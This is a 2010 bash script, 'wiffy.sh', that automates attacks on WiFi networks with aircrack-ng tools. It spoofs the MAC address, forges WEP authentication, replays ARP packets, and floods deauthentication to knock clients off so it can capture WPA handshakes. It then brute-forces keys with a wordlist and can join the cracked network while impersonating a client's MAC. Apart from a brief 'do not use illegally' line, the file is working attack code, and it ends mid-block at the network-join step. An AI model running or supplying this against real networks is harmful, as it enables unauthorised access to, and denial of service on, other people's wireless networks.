#!/bin/bash
#----------------------------------------------------------------------------------------------#
#wiffy.sh v0.1 (#2 2010-09-11)                                                                 #
# (C)opyright 2010 - g0tmi1k                                                                   #
#---License------------------------------------------------------------------------------------#
#  This program is free software: you can redistribute it and/or modify it under the terms     #
#  of the GNU General Public License as published by the Free Software Foundation, either      #
#  version 3 of the License, or (at your option) any later version.                            #
#                                                                                              #
#  This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;   #
#  without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   #
#  See the  GNU General Public License for more details.                                       #
#                                                                                              #
#  You should have received a copy of the GNU General Public License along with this program.  #
#  If not, see <http://www.gnu.org/licenses/>.                                                 #
#---Important----------------------------------------------------------------------------------#
#                     *** Do NOT use this for illegal or malicious use ***                     #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use
interface="wlan0"

# [crack/dos] Crack - cracks WiFi Keys, dos - blocks access to ap.
mode="crack"

# [random/set/false] Change the MAC address
macMode="set"
fakeMac="00:05:7c:9a:58:3f"

# [/path/to/the/folder] The file used to brute force WPA keys.
wordlist="/pentest/passwords/wordlists/wpa.txt"

# [true/false] Connect to network afterwords
extras="false"

# [true/false] diagnostics = Creates a output file displays exactly whats going on. [0/1/2] verbose Shows more info. 0=normal, 1=more , 2=more+commands
diagnostics="false"
verbose="0"

#---Variables----------------------------------------------------------------------------------#
         version="0.1 (#2)"   # Version
monitorInterface="mon0"       # Default
           bssid=""           # null the value
           essid=""           # null the value
         channel=""           # null the value
          client=""           # null the value
           debug="false"      # Windows don't close, shows extra stuff
         logFile="wiffy.log"  # filename of output
trap 'cleanup interrupt' 2    # Captures interrupt signal (Ctrl + C)

#----Functions---------------------------------------------------------------------------------#
function findAP () { #findAP
   action "Scanning network" "rm -f /tmp/wiffy.tmp && iwlist $interface scan > /tmp/wiffy.tmp" $verbose $diagnostics "true"
   arrayESSID=( $(cat /tmp/wiffy.tmp | tr '"' ' ' | awk -F":" '/ESSID/{print $2}' ) )
   arrayBSSID=( $(cat /tmp/wiffy.tmp | grep "Address:" | awk '{print $5}\' ) )
   arrayChannel=( $(cat /tmp/wiffy.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\' ) )
   arrayProtected=( $(cat /tmp/wiffy.tmp | grep "key:" | sed 's/.*key://g' ) )
   arrayQuality=( $(cat /tmp/wiffy.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )

   id=""
   index="0"
   for item in "${arrayBSSID[@]}"; do
      if [ "$bssid" == "$item" ] ; then id=$index ;fi
      command=$(cat /tmp/wiffy.tmp | sed -n "/$item/, +20p" | grep "WPA" )
      if [ "$command" ] ; then arrayEncryption[$index]="WPA"
      elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
      else arrayEncryption[$index]="WEP" ; fi
      index=$(($index+1))
   done
   index="0"
   for item in "${arrayESSID[@]}"; do
      if [ "$essid" == "$item" ] ; then id=$index ;  fi
      index=$(($index+1))
   done
}
function findClient () { #findClient $encryption
   if [ -z "$1" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      client=""
      action "Removing temp files" "rm -f /tmp/wiffy.dump* && sleep 1" $verbose $diagnostics "true"
      action "airodump-ng (client(s))" "airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy.dump --output-format netxml $monitorInterface" $verbose $diagnostics "true" &
      sleep 3
      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then # N/A = For MAC filtering
         sleep 5
         client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1) #> /tmp/wiffy.dump
      elif [ "$1" == "WPA" ] ; then
         while [ -z "$client" ] ; do
            sleep 2
            client=$(cat "/tmp/wiffy.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1) #> /tmp/wiffy.dump
         done
      fi
      command=$(ps aux | grep "airodump-ng" | awk '!/grep/ && !/awk/ && !/cap/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
      if [ -n "$command" ] ; then
         action "Killing programs" "kill $command" $verbose $diagnostics "true"
         sleep 1
      fi
      action "Removing temp files" "rm -f /tmp/wiffy.dump*" $verbose $diagnostics "true"
      if [ "$client" == "" ] ; then client="clientless" ; fi
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "client=$client" $diagnostics ; fi
      return 0
   else
      display error "findClient. Error code: $error" $diagnostics 1>&2
      return 1
   fi
}
function update() { # update
   if [ -e "/usr/bin/svn" ] ; then
      display action "Checking for an update..." $diagnostics
      update=$(svn info http://g0tmi1k.googlecode.com/svn/trunk/wiffy/ | grep "Last Changed Rev:" |cut -c11-)
      if [ "$version" != "0.3 (#$update)" ] ; then
         display info "Updating..." $diagnostics
         svn export -q --force http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh wiffy.sh
         display info "Updated to $update. (=" $diagnostics
      else
         display info "You're using the latest version. (=" $diagnostics
      fi
   else
         display info "Updating..." $diagnostics
         wget -nv -N http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh
         display info "Updated! (=" $diagnostics
   fi
   echo
   exit 2
}
function cleanup() { # cleanup mode
   if [ "$1" == "nonuser" ] ; then exit 3 ; fi

   action "Killing xterm" "killall xterm" $verbose $diagnostics "true"
   if [ "$1" != "clean" ] ; then
      echo # Blank line
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display info "*** BREAK ***" $diagnostics ; fi # User quit
   fi
   display action "Restoring: Environment" $diagnostics

   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" == "$monitorInterface" ] ; then
      sleep 3 # Sometimes it needs to catch up/wait
      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"
   fi

   if [ "$debug" != "true" ] ; then
      command=""
      tmp=$(ls /tmp/wiffy-*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy-*" ; fi
      tmp=$(ls /tmp/wiffy.dump*.netxml 2> /dev/null)
      if [ "$tmp" ] ; then command="$command /tmp/wiffy.dump*" ; fi
      tmp=$(ls replay_arp*.cap 2> /dev/null)
      if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
      if [ -e "/tmp/wiffy.key" ] ; then command="$command /tmp/wiffy.key" ; fi
      if [ -e "/tmp/wiffy.tmp" ] ; then command="$command /tmp/wiffy.tmp" ; fi
      if [ -e "/tmp/wiffy.conf" ] ; then command="$command /tmp/wiffy.conf" ; fi
      if [ -e "/tmp/wiffy.handshake" ] ; then command="$command /tmp/wiffy.handshake" ; fi
      if [ ! -z "$command" ] ; then action "Removing temp files" "rm -rfv $command" $verbose $diagnostics "true" ; fi
   fi

   echo -e "\e[01;36m[*]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [interface] -m [crack/dos] -e [essid] -b [bssid]
               -c [mac] -w [/path/to/file] (-z / -s [mac]) -x -d (-v / -V) ([-u] [-?])

 Options:
   -i  ---  Internet Interface e.g. $interface
   -t  ---  Monitor Interface  e.g. $monitorInterface

   -m  ---  Mode. e.g. $mode

   -e  ---  ESSID (WiFi Name)
   -b  ---  BSSID (AP MAC Address)
   -c  ---  Client that is connect to the acess point

   -w  ---  Path to Wordlist e.g. $wordlist

   -z  ---  Change interface's MAC Address e.g. $macMode
   -s  ---  Use this MAC Address e.g. $fakeMac

   -x  ---  Connect to network afterwords

   -d  ---  Diagnostics      (Creates output file, $logFile)
   -v  ---  Verbose          (Displays more)
   -V  ---  (Higher) Verbose (Displays more + shows commands)

   -u  ---  Update
   -?  ---  This



 Known issues:
    -WEP
       > Didnt detect my client
          + Add it in manually
          + Re-run the script
       > IV's doesn't increaes
          + DeAuth didn't work --- Client using Windows 7?
          + Use a different router/client

    -WPA
       > You can ONLY crack WPA when:
          + The ESSID is known
          + The WiFi key is in the wordlist
          + There is a connected client

    -Doesn't detect any/my wireless network
       > Don't run from a virtual machine
       > Driver issue - Use a different WiFi device
       > Re-run the script
       > Client is too close/far away
       > Unplug WiFi device, wait, replug

    -\"Extra\" doesnt work
       > Network doesnt have a DHCP server

    -Slow
       > Try a different attack... manually!
"
   exit 1
}
function action() { # action title command $verbose $diagnostics screen&file x|y|lines hold
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$7" == "hold" ] ; then xterm="$xterm -hold" ; fi
      if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$4" == "true" ] ; then echo "$1~$command" >> $logFile ; fi
      if [ "$4" == "true" ] && [ "$5" == "true" ] ; then command="$command | tee -a $logFile" ; fi
      if [ ! -z "$6" ] ; then
         x=$(echo $6 | cut -d'|' -f1)
         y=$(echo $6 | cut -d'|' -f2)
         lines=$(echo $6 | cut -d'|' -f3)
      fi
      $xterm -geometry 100x$lines+$x+$y -T "wiffy v$version - $1" -e "$command"
      return 0
   else
      display error "action. Error code: $error" $diagnostics 1>&2
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: action (Error code: $error): $1 , $2 , $3 , $4 , $5 , $6, $7" >> $logFile ;
      return 1
   fi
}
function display() { # display type message $diagnostics
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5"; fi # Coding error
   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ] ;   then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ] ;   then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ]  ; then output="\e[01;31m[-]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"
      if [ "$3" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ] ;   then output="[i]" ; fi
         if [ "$1" == "diag" ] ;   then output="[+]" ; fi
         if [ "$1" == "error" ] ;  then output="[-]" ; fi
         echo -e "---------------------------------------------------------------------------------------------\n$output $2" >> $logFile
      fi
      return 0
   else
      display error "display. Error code: $error" $logFile 1>&2
      echo -e "---------------------------------------------------------------------------------------------\n-->ERROR: display (Error code: $error): $1 , $2 , $3 " >> $logFile ;
      return 1
   fi
}


#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m wiffy v$version"

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:c:w:z:s:xdvV?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      m ) mode=$OPTARG;;
      e ) essid=$OPTARG;;
      b ) bssid=$OPTARG;;
      c ) client=$OPTARG;;
      w ) wordlist=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) extras="true";;
      d ) diagnostics="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update;;
      ? ) help;;
      * ) display error "Unknown option." $diagnostics 1>&2 ;;   # Default
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$debug" == "true" ] ; then
   display info "Debug mode" $diagnostics
fi
if [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode" $diagnostics
   echo -e "wiffy v$version\n$(date)" > $logFile
   echo "wiffy.sh" $* >> $logFile
fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment" $diagnostics

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ] ; then display error "Not a superuser." $diagnostics 1>&2 ; cleanup nonuser; fi

#----------------------------------------------------------------------------------------------#
command=""
tmp=$(ls /tmp/wiffy-*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/wiffy-*" ; fi
tmp=$(ls /tmp/wiffy.dump*.netxml 2> /dev/null)
if [ "$tmp" ] ; then command="$command /tmp/wiffy.dump*" ; fi
tmp=$(ls replay_arp*.cap 2> /dev/null)
if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
if [ -e "/tmp/wiffy.key" ] ; then command="$command /tmp/wiffy.key" ; fi
if [ -e "/tmp/wiffy.tmp" ] ; then command="$command /tmp/wiffy.tmp" ; fi
if [ -e "/tmp/wiffy.conf" ] ; then command="$command /tmp/wiffy.conf" ; fi
if [ -e "/tmp/wiffy.handshake" ] ; then command="$command /tmp/wiffy.handshake" ; fi
if [ ! -z "$command" ] ; then action "Removing old files" "rm -rfv $command" $verbose $diagnostics "true" ; fi

#----------------------------------------------------------------------------------------------#
if [ -z "$interface" ] ; then display error "interface can't be blank" $diagnostics 1>&2 ; cleanup; fi
if [ -z "$monitorInterface" ] ; then display error "monitorInterface can't be blank" $diagnostics 1>&2 ; cleanup; fi
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] ; then display error "mode ($mode) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ ! -e "$wordlist" ] ; then display error "There isn't a wordlist at $wordlist" $diagnostics 1>&2 ; cleanup; fi
if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] ; then display error "macMode ($macMode) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ "$macMode" == "set" ] ; then if [ -z "$fakeMac" ] || [ ! $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then display error "fakeMac ($fakeMac) isn't correct" $diagnostics 1>&2 ; cleanup; fi ; fi
if [ "$mode" == "crack" ] && [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras ($extras) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "diagnostics ($diagnostics) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose ($verbose) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ -z "$version" ] ; then display error "version ($version) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug ($debug) isn't correct" $diagnostics 1>&2 ; cleanup; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ] ; then display error "logFile ($logFile) isn't correct" $diagnostics 1>&2 ; cleanup ; fi

#----------------------------------------------------------------------------------------------#
command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
if [ ! $command ]; then
   display error "$interface isn't a wireless interface." $diagnostics
   display info "Searching for a wireless interface" $diagnostics
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
   if [ $command ] ; then
      interface=$command
      display info "Found $interface" $diagnostics
   else
      display error "Couldn't find a wireless interface." $diagnostics 1>&2
      cleanup
   fi
fi

command=$(ifconfig -a | grep $interface | awk '{print $1}')
if [ "$command" != "$interface" ] ; then
   display error "The wireless interface $interface, isn't correct." $diagnostics 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
mac=$(macchanger --show $interface | awk -F " " '{print $3}')

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Stopping: Programs" $diagnostics ; fi
command=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/wiffy/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   action "Killing programs" "kill $command" $verbose $diagnostics "true" # to prevent interference
fi
action "Killing 'Programs'" "killall wicd-client airodump-ng xterm" $verbose $diagnostics "true" # Killing "wicd-client" to prevent channel hopping
action "Killing 'wicd service'" "/etc/init.d/wicd stop" $verbose $diagnostics "true" # Stopping wicd to prevent channel hopping

#----------------------------------------------------------------------------------------------#
action "Refreshing interface" "ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" $verbose $diagnostics "true"
loopMain="false"
while [ "$loopMain" != "true" ] ; do
   findAP
   if [ "$id" ] ; then
      loopMain="true"
   else
      if [ "$essid" ] ; then display error "Couldnt find essid ($essid)" $diagnostics 1>&2 ; fi
      if [ "$bssid" ] ; then display error "Couldnt find bssid ($bssid)" $diagnostics 1>&2 ; fi
      loop=${#arrayBSSID[@]}
      echo -e " Num |         ESSID          |       BSSID       | Protected | Cha | Quality\n-----|------------------------|-------------------|-----------|-----|---------"
      for (( i=0;i<$loop;i++)); do
         printf "  %-2s | %-22s | %-16s | %3s (%-3s) |  %-3s|  %-6s\n" $(($i+1)) ${arrayESSID[${i}]} ${arrayBSSID[${i}]} ${arrayProtected[${i}]} ${arrayEncryption[${i}]} ${arrayChannel[${i}]} ${arrayQuality[${i}]}
      done
      loopSub="false"
      while [ "$loopSub" != "true" ] ; do
         read -p "[~] [r]escan, e[x]it or select num: "
         if [ "$REPLY" == "x" ] ; then cleanup clean
         elif [ "$REPLY" == "r" ] ; then loopSub="true" # aka do nothing
         elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input, $REPLY" $diagnostics 1>&2
         elif [ "$REPLY" -lt 1 ] || [ "$REPLY" -gt $loop ] ; then display error "Incorrect number, $REPLY" $diagnostics 1>&2
         else id="$(($REPLY-1))" ; loopSub="true" ; loopMain="true"
         fi
      done
   fi
done
essid="${arrayESSID[$id]}"
bssid="${arrayBSSID[$id]}"
channel="${arrayChannel[$id]}"
encryption="${arrayEncryption[$id]}"

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then
   echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
 monitorInterface=$monitorInterface
             mode=$mode
            essid=$essid
            bssid=$bssid
       encryption=$encryption
          channel=$channel
           client=$client
         wordlist=$wordlist
              mac=$mac
          macMode=$macMode
          fakeMac=$fakeMac
      diagnostics=$diagnostics
          verbose=$verbose
            debug=$debug
-Environment---------------------------------------------------------------------------------" >> $logFile
   display diag "Detecting: Kernal" $diagnostics
   uname -a >> $logFile
   display diag "Detecting: Hardware" $diagnostics
   lspci -knn >> $logFile
fi
if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "       interface=$interface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m             mode=$mode
\e[01;33m[i]\e[00m            essid=$essid
\e[01;33m[i]\e[00m            bssid=$bssid
\e[01;33m[i]\e[00m       encryption=$encryption
\e[01;33m[i]\e[00m          channel=$channel
\e[01;33m[i]\e[00m           client=$client
\e[01;33m[i]\e[00m         wordlist=$wordlist
\e[01;33m[i]\e[00m              mac=$mac
\e[01;33m[i]\e[00m          macMode=$macMode
\e[01;33m[i]\e[00m          fakeMac=$fakeMac
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m            debug=$debug"
fi

#----------------------------------------------------------------------------------------------#
if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
   display error "aircrack-ng isn't installed." $diagnostics 1>&2
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" $verbose $diagnostics "true" ; fi
   if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
      display error "Failed to install aircrack-ng" $diagnostics 1>&2 ; cleanup
   else
      display info "Installed aircrack-ng" $diagnostics
   fi
fi
if [ ! -e "/usr/bin/macchanger" ] ; then
   display error "macchanger isn't installed." $diagnostics
   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" $verbose $diagnostics "true" ; fi
   if [ ! -e "/usr/bin/macchanger" ] ; then
      display error "Failed to install macchanger" $diagnostics 1>&2 ; cleanup
   else
      display info "Installed macchanger" $diagnostics
   fi
fi
#if [ "$attack" == "inject" ] ; then
#   if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
#      display error "airpwn isn't installed." $diagnostics
#      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
#      if [[ $REPLY =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" $verbose $diagnostics "true" ; fi
#      action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz" $verbose $diagnostics "true"
#      find="#include <linux/if.h>\n#ifndef _LINUX_WIRELESS_H"
#      replace="#ifndef _LINUX_WIRELESS_H"
#      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h" > "/usr/include/linux/wireless.h.new"
#      find="#ifndef _LINUX_WIRELESS_H"
#      replace="#include <linux/if.h>\n#ifndef _LINUX_WIRELESS_H"
#      sed "s/$find/$replace/g" "/usr/include/linux/wireless.h.new" > "/usr/include/linux/wireless.h"
#      rm -f "/usr/include/linux/wireless.h.new"
#      action "Install airpwn" "command=$(pwd) && tar -C /pentest/wireless/airpwn-1.4 -xvf /pentest/wireless/airpwn-1.4/lorcon-current.tgz && cd /pentest/wireless/airpwn-1.4/lorcon && ./configure && make && make install && cd $command" $verbose $diagnostics "true"
#      action "Install airpwn" "command=$(pwd) && cd /pentest/wireless/airpwn-1.4 && ./configure && make && cd $command" $verbose $diagnostics "true"
#      if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
#         display error "Failed to install airpwn" $diagnostics 1>&2 ; cleanup
#      else
#         display info "Installed airpwn" $diagnostics
#      fi
#   fi
#fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment" $diagnostics

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Wireless card" $diagnostics ; fi
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" == "$monitorInterface" ] ; then
   action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"
   sleep 1
fi

action "Monitor Mode (Starting)" "airmon-ng start $interface | awk '/monitor mode enabled on/ {print \$5}' | tr -d '\011' | sed -e \"s/(monitor mode enabled on //\" | sed 's/\(.*\)./\1/' > /tmp/wiffy.tmp" $verbose $diagnostics "true"
command=$(cat /tmp/wiffy.tmp)
if [ "$monitorInterface" != "$command" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
      display info "Configuring: Chaning monitorInterface to: $command" $diagnostics
   fi
   monitorInterface=$command
fi

command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" != "$monitorInterface" ] ; then
   sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ] ; then
      display error "The monitor interface $monitorInterface, isn't correct." $diagnostics 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then
   display diag "Testing: Wireless Injection" $diagnostics
   command=$(aireplay-ng --test $monitorInterface -i $monitorInterface)
   if [ "$diagnostics" == "true" ] ; then echo -e $command >> $logFile ; fi
   if [ -z "$(echo \"$command\" | grep 'Injection is working')" ] ; then display error "$monitorInterface doesn't support packet injecting." $diagnostics 1>&2
   elif [ -z "$(echo \"$command\" | grep 'Found 0 APs')" ] ; then display error "Couldn't test packet injection" $diagnostics 1>&2 ;
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$macMode" != "false" ] ; then
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: MAC address" $diagnostics ; fi
   command="ifconfig $monitorInterface down &&"
   if [ "$macMode" == "random" ] ; then  command="$command macchanger -A $monitorInterface &&"; fi
   if [ "$macMode" == "set" ] ; then  command="$command macchanger -m $fakeMac $monitorInterface &&"; fi
   command="$command ifconfig $monitorInterface up"
   action "Configuring: MAC address" "$command" $verbose $diagnostics "true"
   sleep 2
   mac="$fakeMac"
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "crack" ] ; then
   if [ -z "$client" ] ; then
      display action "Detecting: Client(s)" $diagnostics
      findClient $encryption
   fi

   #----------------------------------------------------------------------------------------------#
   display action "Starting: airodump-ng" $diagnostics
   action "Removing temp files" "rm -f /tmp/wiffy* && sleep 1" $verbose $diagnostics "true"
   action "airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/wiffy --output-format cap $monitorInterface" $verbose $diagnostics "true" "0|0|13" & # Don't wait, do the next command
   sleep 1

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] ; then
      if [ "$client" == "clientless" ] ; then
         display action "Attack (FakeAuth): $fakeMac" $diagnostics
         action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e $essid -a $bssid -h $mac $monitorInterface" $verbose $diagnostics "true"
         #action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 30 -o 1 -q 10 -e $essid -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true"
         #if [Association successful] = then
         client=$mac
         sleep 1
      fi
      display action "Attack (ARPReplay+Deauth): $client" $diagnostics
      action "aireplay-ng (arpreplay)" "aireplay-ng --arpreplay -e $essid -b $bssid -h $client $monitorInterface" $verbose $diagnostics "true" "0|195|10" & # Don't wait, do the next command
      sleep 1
      action "aireplay-ng (deauth)" "aireplay-ng --deauth 5 -e $essid -a $bssid -c $fakeMac $monitorInterface" $verbose $diagnostics "true"
      sleep 1
      if [ "$client" == "$mac" ] ; then sleep 20 && action "aireplay-ng (fakeauth)" "aireplay-ng --fakeauth 0 -e $essid -a $bssid -h $fakeMac $monitorInterface" $verbose $diagnostics "true" ; fi
      sleep 60

   #----------------------------------------------------------------------------------------------#
   elif [ "$encryption" == "WPA" ] ; then
      display action "Capturing: Handshake" $diagnostics
      loop="0" # 0 = first, 1 = client, 2 = everyone
      echo "g0tmi1k" > /tmp/wiffy.tmp
      for (( ; ; )) ; do
         action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w /tmp/wiffy.tmp -e $essid > /tmp/wiffy.handshake" $verbose $diagnostics "true"
         command=$(cat /tmp/wiffy.handshake | grep "Passphrase not in dictionary" ) #Got no data packets from client network & No valid WPA handshakes found
         if [ "$command" ] ; then break; fi
         sleep 2
         if [ "$loop" != "1" ] ; then
            if [ "$loop" != "0" ] ; then findClient $encryption ; fi
            sleep 1
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Deauth): $client" $diagnostics ; fi
            action "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid -c $client mon0" $verbose $diagnostics "true"
            loop="1"
         else
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Attack (Deauth): *everyone*" $diagnostics ; fi
            action "aireplay-ng" "aireplay-ng --deauth 5 -a $bssid mon0" $verbose $diagnostics "true"
            loop="2"
         fi
         sleep 1
      done
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Captured: Handshake" $diagnostics ; fi
      action "Killing programs" "killall xterm && sleep 1" $verbose $diagnostics "true"
   fi

   #----------------------------------------------------------------------------------------------#
   if [ "$encryption" == "WEP" ] || [ "$encryption" == "WPA" ] ; then
      display action "Starting: aircrack-ng" $diagnostics
      if [ "$encryption" == "WEP" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -e $essid -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|350|30" ; fi
      if [ "$encryption" == "WPA" ] ; then action "aircrack-ng" "aircrack-ng /tmp/wiffy*.cap -w $wordlist -e $essid -l /tmp/wiffy.key" $verbose $diagnostics "false" "0|0|20" ; fi
   fi

   #----------------------------------------------------------------------------------------------#
   action "Killing programs" "killall xterm && sleep 1" $verbose $diagnostics "true"
   action "airmon-ng" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"

   #----------------------------------------------------------------------------------------------#
   if [ -e "/tmp/wiffy.key" ] ; then
      key=$(cat /tmp/wiffy.key)
      display info "WiFi key: $key" $diagnostics
      #----------------------------------------------------------------------------------------------#
      if [ "$extras" == "true" ] ; then
         if [ "$client" != "$mac" ] ; then
            if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then  display action "Attack (Spoofing): $client ('Helps' with MAC filtering) " $diagnostics ; fi
            action "airmon-ng" "ifconfig $interface down && macchanger -m $client $interface && ifconfig $interface up" $verbose $diagnostics "true"
         fi
         display action "Joining: $essid" $diagnostics
         if [ "$encryption" == "WEP" ] ; then
